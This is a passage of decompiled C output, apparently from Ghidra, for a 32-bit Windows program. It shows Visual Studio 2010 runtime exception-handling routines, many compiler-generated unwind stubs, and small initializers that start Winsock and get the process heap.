  return;
}



/* Function: FUN_00413f0a */

exception * __thiscall FUN_00413f0a(void *this,exception *param_1)

{
  std::exception::exception((exception *)this,param_1);
  *(undefined ***)this = std::bad_exception::vftable;
  return (exception *)this;
}



/* Function: ___InternalCxxFrameHandler */

/* Library Function - Single Match
    ___InternalCxxFrameHandler
   
   Library: Visual Studio 2010 Release */

undefined4 __cdecl
___InternalCxxFrameHandler
          (EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
          _s_FuncInfo *param_5,int param_6,EHRegistrationNode *param_7,uchar param_8)

{
  _ptiddata p_Var1;
  undefined4 uVar2;
  
  p_Var1 = __getptd();
  if ((((*(int *)((p_Var1->_setloc_data)._cacheout + 0x27) != 0) || (*(int *)param_1 == -0x1f928c9d)
       ) || (*(int *)param_1 == -0x7fffffda)) ||
     (((param_5->magicNumber_and_bbtFlags & 0x1fffffff) < 0x19930522 ||
      ((param_5->EHFlags & 1) == 0)))) {
    if (((byte)param_1[4] & 0x66) == 0) {
      if ((param_5->nTryBlocks != 0) ||
         ((0x19930520 < (param_5->magicNumber_and_bbtFlags & 0x1fffffff) &&
          (param_5->pESTypeList != (ESTypeList *)0x0)))) {
        if ((*(int *)param_1 == -0x1f928c9d) &&
           (((2 < *(uint *)(param_1 + 0x10) && (0x19930522 < *(uint *)(param_1 + 0x14))) &&
            (*(code **)(*(int *)(param_1 + 0x1c) + 8) != (code *)0x0)))) {
          uVar2 = (**(code **)(*(int *)(param_1 + 0x1c) + 8))
                            (param_1,param_2,param_3,param_4,param_5,param_6,param_7,param_8);
          return uVar2;
        }
        FindHandler(param_1,param_2,param_3,param_4,param_5,param_8,param_6,param_7);
      }
    }
    else if ((param_5->maxState != 0) && (param_6 == 0)) {
      ___FrameUnwindToState((int)param_2,param_4,(int)param_5,-1);
    }
  }
  return 1;
}



/* Function: __CallSettingFrame@12 */

/* WARNING: Restarted to delay deadcode elimination for space: stack */
/* Library Function - Single Match
    __CallSettingFrame@12
   
   Library: Visual Studio 2010 Release */

void __CallSettingFrame_12(undefined4 param_1,undefined4 param_2,int param_3)

{
  code *pcVar1;
  
  pcVar1 = (code *)__NLG_Notify1(param_3);
  (*pcVar1)();
  if (param_3 == 0x100) {
    param_3 = 2;
  }
  __NLG_Notify1(param_3);
  return;
}



/* Function: __EH_prolog3_catch */

/* WARNING: This is an inlined function */
/* WARNING: Unable to track spacebase fully for stack */
/* WARNING: Variable defined which should be unmapped: param_1 */
/* Library Function - Single Match
    __EH_prolog3_catch
   
   Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2010, Visual Studio 2012 */

void __cdecl __EH_prolog3_catch(int param_1)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined4 unaff_retaddr;
  uint auStack_1c [5];
  undefined1 local_8 [8];
  
  iVar1 = -param_1;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack_1c + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack_1c + iVar1 + 4) = DAT_004191b4 ^ (uint)&param_1;
  *(undefined4 *)((int)auStack_1c + iVar1) = unaff_retaddr;
  ExceptionList = local_8;
  return;
}



/* Function: _ValidateRead */

/* Library Function - Single Match
    int __cdecl _ValidateRead(void const *,unsigned int)
   
   Library: Visual Studio 2010 Release */

int __cdecl _ValidateRead(void *param_1,uint param_2)

{
  return (uint)(param_1 != (void *)0x0);
}



/* Function: Unwind@004140b0 */

void Unwind_004140b0(void)

{
  FUN_00405a10();
  return;
}



/* Function: Unwind@004140bb */

void Unwind_004140bb(void)

{
  FUN_004065b0();
  return;
}



/* Function: Unwind@004140c6 */

void Unwind_004140c6(void)

{
  FUN_00406650();
  return;
}



/* Function: Unwind@004140d1 */

void Unwind_004140d1(void)

{
  FUN_004012a0();
  return;
}



/* Function: Unwind@004140de */

void Unwind_004140de(void)

{
  thunk_FUN_00401350();
  return;
}



/* Function: Unwind@004140ec */

void Unwind_004140ec(void)

{
  FUN_00405a10();
  return;
}



/* Function: Unwind@004140f9 */

void Unwind_004140f9(void)

{
  FUN_00405a10();
  return;
}



/* Function: Unwind@00414106 */

void Unwind_00414106(void)

{
  FUN_00405a10();
  return;
}



/* Function: Unwind@00414113 */

void Unwind_00414113(void)

{
  FUN_004012a0();
  return;
}



/* Function: Unwind@0041411e */

void Unwind_0041411e(void)

{
  int unaff_EBP;
  
  FUN_004066d0((undefined4 *)(*(int *)(unaff_EBP + 8) + 0x1d8));
  return;
}



/* Function: Unwind@0041412c */

void Unwind_0041412c(void)

{
  int unaff_EBP;
  
  FUN_00401040((undefined4 *)(*(int *)(unaff_EBP + 8) + 0x234));
  return;
}



/* Function: Unwind@0041413a */

void Unwind_0041413a(void)

{
  int unaff_EBP;
  
  FUN_00401040((undefined4 *)(*(int *)(unaff_EBP + 8) + 0x244));
  return;
}



/* Function: Unwind@00414148 */

void Unwind_00414148(void)

{
  int unaff_EBP;
  
  FUN_00401040((undefined4 *)(*(int *)(unaff_EBP + 8) + 0x254));
  return;
}



/* Function: Unwind@00414180 */

void Unwind_00414180(void)

{
  FUN_004012a0();
  return;
}



/* Function: Unwind@0041418b */

void Unwind_0041418b(void)

{
  FUN_004012a0();
  return;
}



/* Function: Unwind@004141c0 */

void Unwind_004141c0(void)

{
  int unaff_EBP;
  
  FUN_004069ca(*(void **)(unaff_EBP + -0x18));
  return;
}



/* Function: Unwind@004141cb */

void Unwind_004141cb(void)

{
  int unaff_EBP;
  
  FUN_004054a0((undefined4 *)(unaff_EBP + -0x34));
  return;
}



/* Function: Unwind@004141f0 */

void Unwind_004141f0(void)

{
  FUN_00401340();
  return;
}



/* Function: Unwind@00414220 */

void Unwind_00414220(void)

{
  FUN_004052b0();
  return;
}



/* Function: Unwind@00414228 */

void Unwind_00414228(void)

{
  FUN_00401340();
  return;
}



/* Function: FUN_00414280 */

/* WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe */

void FUN_00414280(void)

{
  undefined1 auStack_198 [396];
  undefined4 uStack_c;
  uint local_8;
  
  local_8 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  uStack_c = 0x414298;
  DAT_0041da84 = Ordinal_115(0x202,auStack_198);
  _atexit((_func_4879 *)&LAB_00414300);
  uStack_c = 0x4142c3;
  __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



/* Function: FUN_004142c7 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_004142c7(void)

{
  _DAT_0041ab64 = GetProcessHeap();
  _DAT_0041ab60 = &PTR_FUN_00415270;
  DAT_0041ab68 = 0;
  _atexit((_func_4879 *)&LAB_00414310);
  return;
}



